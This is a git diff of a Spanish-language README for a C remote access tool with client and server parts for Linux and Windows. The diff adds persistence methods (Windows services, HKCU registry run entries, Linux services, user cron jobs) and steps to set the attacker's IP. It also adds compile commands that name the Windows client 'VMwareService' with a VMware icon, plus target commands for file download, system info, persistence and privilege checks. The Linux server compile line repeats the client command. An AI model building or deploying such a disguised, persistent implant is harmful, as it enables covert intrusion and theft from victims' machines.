@@ -9,26 +9,45 @@ En desarollo...
   - Compilador GCC (preferiblemente de 64Bits) [DOWNLOAD LINK](https://github.com/brechtsanders/winlibs_mingw/releases/download/13.2.0mcf-16.0.6-11.0.1-ucrt-r2/winlibs-x86_64-mcf-seh-gcc-13.2.0-llvm-16.0.6-mingw-w64ucrt-11.0.1-r2.7z)
   - Linux: `# apt install build-essential`  
 
+# News
+
+1. High Persistence Windows:
+    
+        Generamos un servicio de windows y lo configuramos para ejecutarse al arranque del sistema operativo
+2. Low persistence Windows:
+
+        Entrada en el registro HKCU
+3. High Persistence Linux:
+
+        Generamos otro servicio para que se ejecute en el inicio del SO.
+4.  Low persistence Linux:
+
+        Generamos una tarea cron de usuario que se ejecuta al inciar el PC
+
+
 # Preparation Linux
 
-1. Modifica el archivo **client.c** para especificar la dirección IP y el puerto de destino y si es necesario el del servidor:
-   1. Cliente:
+### 1. Set IP
+Modifica el archivo **[client.c](Linux/client.c)** para especificar la dirección IP y el puerto de destino y si es necesario el del servidor:
+   1. [Cliente](Linux/client.c):
 
       ![img.png](img/img.png)
 
-   2. Server:
+   2. [Server](Linux/server.c):
 
-      ![img_1.png](img/img_1.png)
+      ![img.png](img/img_1.png)
 
-2.  Compilamos:
+### 2. Compile:
 
-    - Cliente:
-        `gcc linux/client.c -o linux/client`
-    - Server:
-        `gcc linux/client.c -o linux/client`
+- **Cliente:**
+
+        gcc linux/client.c -o linux/client
+- **Server:**
+
+        gcc linux/client.c -o linux/client
 
 
-3. Ejecutamos:
+### 3. Execute:
 
 - Server:
 
@@ -38,23 +57,28 @@ En desarollo...
 
 # Preparation Windows
 
-1. Modificamos el archivo **client.c** especificando la IP de atacante y el puerto especificado en **server.c**
+### 1. Set IP
+Modificamos el archivo **[src/mainFuctsWin.c](src/mainFuctsWin.c)** especificando la IP de atacante y el puerto especificado en **server.c**
 
-    ![img_3.png](img/img_3.png)
-
-
-2. Compilamos:
-
-    - Cliente:
-      ` gcc -mwindows .\client.c -o .\dist\clientwindows -lws2_32 -lShlwapi`
-
-    - Server:
-      `gcc .\server.c -o .\dist\server -lws2_32 -lShlwapi`
+![img_3.png](img/img_3.png)
 
 
-3. Ejecutamos:
+### 2. Compile:
 
-- Server:
+- [Cliente](Windows/client.c) + **VMWARE ICON**:
+
+      gcc -mwindows .\client.c -o .\dist\VMwareService -lws2_32 -lShlwapi ../src/icon.o
+- [Cliente](Windows/client.c):
+
+      gcc -mwindows .\client.c -o .\dist\VMwareService -lws2_32 -lShlwapi 
+- [Server](Windows/server.c):
+
+      gcc .\server.c -o .\dist\server -lws2_32 -lShlwapi
+
+
+### 3. Execute:
+
+- **Server:**
 
   ![img_4.png](img/img_4.png)
 
@@ -68,5 +92,7 @@ Por el momento tenemos disponible los siguientes comandos:
     - download <file> -> Download file from target
     - sysinfo         -> Show system info (better on linux)
     - lowpersistence  -> Set persistence (no root)
+    - peristence      -> Set persistence (root needed)
+    - check           -> List privileges
     - q / exit        -> Exit server
     - q -y / exit -y  -> Exit server and client (close binary) 
